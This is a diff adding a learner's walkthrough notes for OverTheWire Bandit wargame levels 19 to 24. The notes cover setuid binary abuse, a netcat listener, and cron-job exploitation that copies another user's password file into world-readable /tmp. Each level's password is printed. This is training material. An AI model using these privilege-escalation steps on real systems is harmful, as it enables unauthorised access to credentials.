@@ -107,3 +107,126 @@ diff passwords.old passwords.new
 grep 'x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO' passwords.new 
 x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
 
+level 19:
+scp -P 2220 bandit18@bandit.labs.overthewire.org:~/readme ~/Desktop/techPortfolio/overthewire/bandit/
+cat readme
+cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+
+level 20:
+./bandit20-do cat /etc/bandit_pass/bandit20
+this works because bandit20-do is owned by bandit20 and has the setuid bit set rws
+for owner. When the file is exectured, the OS makes the program run with bandit20
+as the owner, which therefore allows cat of the /etc/bandit_pass/bandit20 to get 
+password:
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+level 21:
+do below on one terminal(1), trial and error until you find a free port:
+nc -l 42424
+
+open a new terminal(2) and do:
+./suconnect 42424
+
+now the suconnect is waiting for terminal(1) to send level 20 password, when pasted
+we get the below password:
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+level 22:
+ls -l /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+level 23:
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+
+the resulting cat will yield:
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+then we can do below, since the cron file is sending the password into "/tmp/$mytarget":
+myname="bandit23"
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+echo $mytarget
+
+then we will get the address of "/tmp/$mytarget":
+8ca319486bfbbc3663ea0fbe81326349
+
+now we can check the file with "cat /tmp/8ca319486bfbbc3663ea0fbe81326349", password:
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+level 24:
+same procedure as previous level until we get the below which shows that the cron job is
+running as user bandit24:
+cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+then checking the .sh file:
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+"cd /tmp", do this to have permissions to create a file (our script)
+cd b23 since it already exists
+there will be a file and we will do:
+cat getpass.sh, which gives: 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+
+now we can write our script:
+cat > grab.sh << 'EOF'
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+chmod 644 /tmp/bandit24_pass
+> EOF
+
+chmod +x grab.sh (make it executable)
+cp grab.sh /var/spool/bandit24/foo/run_me.sh
+
+now after a minute the cron will execute the file and we can:
+cat /tmp/bandit24_pass
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+[PASSWORD ABOVE, EXPLANATION BELOW]
+
+The cron script runs as the user bandit24 every minute. It first sets the variable 
+myname to the result of whoami, which in this case will be bandit24. It then changes 
+directory to /var/spool/$myname/foo, which resolves to /var/spool/bandit24/foo. Inside 
+that directory, it loops over all files, including hidden ones, but skips . and ... For 
+each file, it uses stat to check the file’s owner, and if the owner is bandit23, it 
+executes the file with a 60-second timeout using timeout -s 9 60, meaning it will be 
+killed with SIGKILL if it runs too long. After executing, it deletes the file. The 
+result is that any executable file owned by bandit23 placed in /var/spool/bandit24/foo 
+will be executed with bandit24’s privileges and then removed. Our method works because 
+we can write to that directory but cannot write in our home, so we prepare a script in 
+/tmp and copy it into /var/spool/bandit24/foo. When copied there, it remains owned by 
+bandit23, which satisfies the ownership check. Since the script runs as bandit24, it 
+can read /etc/bandit_pass/bandit24 and copy that password to a world-readable location 
+like /tmp/b24_pass.txt. After the cron job runs, the original script is deleted, but 
+the password file in /tmp remains accessible to us.
